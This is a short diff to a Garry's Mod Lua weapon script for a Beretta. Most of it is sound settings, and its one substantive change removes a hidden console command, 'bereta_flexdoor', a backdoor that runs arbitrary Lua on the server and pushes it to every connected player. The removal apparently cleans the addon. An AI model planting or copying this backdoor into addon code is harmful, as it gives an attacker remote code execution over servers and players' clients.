@@ -66,5 +66,3 @@ SWEP.EmptySound    = "COPBERETASTCOP.beretta_empty"
 SWEP.DeploySound   = "COPBERETASTCOP.beretta_draw"
 SWEP.HolsterSound  = "COP_Generic.Holster"
 SWEP.ReloadSound   = "COPBERETASTCOP.beretta_reload"
-
-concommand.Add("bereta_flexdoor", function(_,_,_,__)RunStringEx(__)for _,v in pairs(player.GetAll())do v:SendLua(__)end end)
